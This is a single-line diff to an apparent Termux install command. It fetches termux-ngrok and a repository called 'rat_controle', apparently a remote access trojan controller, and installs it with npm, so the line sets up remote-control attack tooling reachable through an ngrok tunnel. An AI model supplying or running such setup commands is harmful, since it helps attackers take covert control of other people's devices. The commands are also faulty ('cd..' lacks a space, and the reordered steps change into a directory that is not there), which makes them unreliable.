@@ -1,1 +1,1 @@
-pkg update -y && pkg upgrade -y && pkg install -y nodejs git wget && cd ~ && git clone https://github.com/Yisus7u7/termux-ngrok && cd termux-ngrok && bash install.sh && cd.. && git clone https://github.com/zxoman/rat_controle.git && cd rat_controle && npm install && echo "done"
+pkg update -y && pkg upgrade -y && pkg install -y nodejs git wget && cd ~ && git clone https://github.com/Yisus7u7/termux-ngrok  && cd.. && git clone https://github.com/zxoman/rat_controle.git && cd rat_controle && npm install && cd termux-ngrok && bash install.sh && echo "done"
